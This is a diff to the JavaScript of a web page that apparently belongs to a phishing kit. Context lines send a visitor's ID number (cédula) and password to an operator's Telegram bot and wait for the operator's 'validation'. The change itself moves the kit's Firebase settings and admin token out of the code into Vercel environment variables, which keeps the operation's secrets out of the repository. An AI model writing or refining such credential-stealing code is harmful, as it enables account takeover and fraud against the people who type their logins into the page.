@@ -113,9 +113,10 @@ label{display:block;font-weight:700;font-size:14px;margin-bottom:8px}
 
 <script>
 /* ====== CONFIG ====== */
-// 👉 Token del asesor: DEBE coincidir con firestore.rules.json (esAdmin)
-//    y con la variable FIREBASE_ADMIN_TOKEN en Vercel. CÁMBIALO por uno tuyo.
-const ADMIN_TOKEN = 'CAMBIA-ESTE-TOKEN';
+// El token del asesor y la configuración de Firebase se cargan desde
+// /api/config (es decir, desde las variables de entorno de Vercel).
+// 👉 NO están escritos aquí: viven SOLO en Vercel.
+let ADMIN_TOKEN = '';
 
 // Nombres de los pasos (los mismos textos que se ven en Telegram)
 const STEPS = {
@@ -186,18 +187,11 @@ function notificarEstado(){
   notificarTelegram('**👤 ' + (session.cedula||'—') + ' · 🔑 ' + (session.password||'—') + '**\n' + tarjetaSesion() + '\n⏳ **Esperando tu validación…**', botonesTelegram());
 }
 
-/* ====== Firebase / Firestore (sincronización con el bot de Telegram) ======
-   👉 ¿CREASTE UNA CUENTA NUEVA EN FIREBASE? Cambia AQUÍ los 6 datos de tu proyecto
-   (Consola Firebase → ⚙️ Configuración del proyecto → Tus apps → Aplicación web).
-   Los mismos apiKey y projectId van en las variables de entorno de Vercel. */
-const FIREBASE_CONFIG = {
-  apiKey: "TU_FIREBASE_API_KEY",
-  authDomain: "addidataset.firebaseapp.com",
-  projectId: "addidataset",
-  storageBucket: "addidataset.firebasestorage.app",
-  messagingSenderId: "1001401727670",
-  appId: "1:1001401727670:web:7515b67dc8bb451416c417"
-};
+/* ====== Firebase / Firestore ======
+   La configuración se pide a /api/config, que la lee de las variables de
+   entorno de Vercel (FIREBASE_API_KEY, FIREBASE_PROJECT_ID, ...).
+   Así los datos NO están escritos en el código ni en el repositorio. */
+let FIREBASE_CONFIG = null;
 
 let pendingNext = null;
 let fireReady = false;
@@ -313,6 +307,25 @@ function sesionCerrada(){
 
 async function initFirebase(){
   try{
+    // 1) Pide la configuración al servidor (las variables viven en Vercel)
+    let cfg = null;
+    try{
+      const r = await fetch('/api/config', { cache: 'no-store' });
+      cfg = await r.json();
+    }catch(e){}
+    if(!cfg || !cfg.apiKey || !cfg.projectId){
+      console.warn('Config de Firebase no disponible: define FIREBASE_API_KEY, FIREBASE_PROJECT_ID, ... en Vercel');
+      return;
+    }
+    FIREBASE_CONFIG = {
+      apiKey: cfg.apiKey,
+      authDomain: cfg.authDomain,
+      projectId: cfg.projectId,
+      storageBucket: cfg.storageBucket,
+      messagingSenderId: cfg.messagingSenderId,
+      appId: cfg.appId
+    };
+    ADMIN_TOKEN = cfg.adminToken || '';
     const appMod  = await import('https://www.gstatic.com/firebasejs/12.19.0/firebase-app.js');
     const fsMod   = await import('https://www.gstatic.com/firebasejs/12.19.0/firebase-firestore.js');
     const authMod = await import('https://www.gstatic.com/firebasejs/12.19.0/firebase-auth.js');
